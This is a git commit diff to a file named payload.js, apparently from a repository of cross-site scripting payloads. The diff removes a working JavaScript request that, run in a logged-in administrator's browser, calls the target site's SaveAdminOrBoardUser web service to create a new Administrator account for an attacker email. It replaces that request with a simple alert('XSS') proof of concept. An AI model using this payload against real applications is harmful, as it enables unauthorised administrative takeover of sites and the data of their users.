ad1dd866c9ce55bf560855be600284291faca821
Yuvaraj <98304205+yuvarajsf@users.noreply.github.com>
2025-06-26 08:06:45 +0530

    Update payload.js

--- payload.js
+++ payload.js
@@ -1,18 +1,2 @@
-fetch('/WebServices/AdminWS.asmx/SaveAdminOrBoardUser', {
-    method: 'POST',
-    headers: {
-        'Content-Type': 'application/json'
-    },
-    body: JSON.stringify({
-        user: {
-            UserID: 0,
-            FirstName: "yuvaraj",
-            LastName: "hacker",
-            RegisteredEmail: "yuvarajsfattacker@gmail.com"
-        },
-        userRole: "Administrator"
-    })
-})
-.then(response => response.json())
-.then(data => console.log("Success:", data))
-.catch(error => console.error("Error:", error));
+console.log("Fetched from remote server");
+alert("XSS");
